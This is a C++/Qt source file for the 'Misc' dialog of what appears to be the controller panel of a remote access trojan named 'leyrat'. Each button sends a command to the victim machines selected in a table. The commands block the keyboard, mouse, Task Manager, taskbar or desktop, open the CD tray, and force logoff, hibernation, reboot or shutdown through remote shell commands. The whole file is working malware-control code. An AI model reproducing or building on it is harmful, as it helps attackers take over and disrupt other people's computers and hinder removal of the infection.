#include "funstuff.h"
#include "ui_funstuff.h"

#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "leyrat.h"

extern Ui::MainWindow *mainwin;
extern leyrat rat;

Funstuff::Funstuff(QWidget *parent) :
    QDialog(parent),
    ui(new Ui::Funstuff)
{
    ui->setupUi(this);

    this->setWindowTitle("Misc");

    this->setWindowFlags(windowFlags() & ~Qt::WindowContextHelpButtonHint | Qt::MSWindowsFixedSizeDialogHint);

    ui->pushButton->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_2->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_3->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_4->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_5->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_6->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_7->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_8->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_9->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_10->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_11->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_12->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_13->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_14->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_15->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_16->setFocusPolicy(Qt::NoFocus);

}

Funstuff::~Funstuff()
{
    delete ui;
}

void Funstuff::on_pushButton_pressed()//block keyboard
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_InputBlock(item->text().toStdString().c_str(), false, true);

    }
}

void Funstuff::on_pushButton_2_pressed()//unblock keyboard
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_InputBlock(item->text().toStdString().c_str(), false, false);

    }
}

void Funstuff::on_pushButton_3_pressed()//block mouse
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected)
    {

        if(item->column() != 2)  continue;
        rat.Request_InputBlock(item->text().toStdString().c_str(), true, true);

    }
}

void Funstuff::on_pushButton_4_pressed()//unblock mouse
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected)
    {

        if(item->column() != 2)  continue;
        rat.Request_InputBlock(item->text().toStdString().c_str(), true, false);

    }
}

void Funstuff::on_pushButton_5_pressed()//block taskmgr
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected)
    {

        if(item->column() != 2)  continue;
        rat.Request_TaskmgrBlock(item->text().toStdString().c_str(), true);

    }
}

void Funstuff::on_pushButton_6_pressed()//unblock taskmgr
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected)
    {

        if(item->column() != 2)  continue;
        rat.Request_TaskmgrBlock(item->text().toStdString().c_str(), false);

    }
}

void Funstuff::on_pushButton_11_pressed()//block taskbar
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected)
    {

        if(item->column() != 2)  continue;
       rat.Request_TaskbarBlock(item->text().toStdString().c_str(), true);

    }
}

void Funstuff::on_pushButton_12_pressed()//unblock taskbar
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected)
    {

        if(item->column() != 2)  continue;
       rat.Request_TaskbarBlock(item->text().toStdString().c_str(), false);

    }
}

void Funstuff::on_pushButton_7_pressed()//block desktop
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected)
    {

        if(item->column() != 2)  continue;
        rat.Request_DesktopBlock(item->text().toStdString().c_str(), true);

    }
}

void Funstuff::on_pushButton_8_pressed()//unblock desktop
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected)
    {

        if(item->column() != 2)  continue;
        rat.Request_DesktopBlock(item->text().toStdString().c_str(), false);

    }
}

void Funstuff::on_pushButton_9_pressed()//open cd tray
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected)
    {

        if(item->column() != 2)  continue;
        rat.Request_DiskTray(item->text().toStdString().c_str(), true);

    }
}

void Funstuff::on_pushButton_10_pressed()//close cd tray
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected)
    {

        if(item->column() != 2)  continue;
        rat.Request_DiskTray(item->text().toStdString().c_str(), false);

    }
}

void Funstuff::on_pushButton_13_pressed()//log off
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected)
    {

        if(item->column() != 2)  continue;
        rat.Request_RunCmd(item->text().toStdString().c_str(), "shutdown -l");
    }
}

void Funstuff::on_pushButton_14_pressed()//hibernate
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected)
    {
        if(item->column() != 2)  continue;
        rat.Request_RunCmd(item->text().toStdString().c_str(), "rundll32.exe powrprof.dll,SetSuspendState");
    }
}

void Funstuff::on_pushButton_15_pressed()//reboot
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected)
    {

        if(item->column() != 2)  continue;
        rat.Request_RunCmd(item->text().toStdString().c_str(), "shutdown -t 0 -r -f");
    }
}

void Funstuff::on_pushButton_16_pressed()//shutdown
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected)
    {

        if(item->column() != 2)  continue;
        rat.Request_RunCmd(item->text().toStdString().c_str(), "shutdown -t 0 -s -f");
    }
}
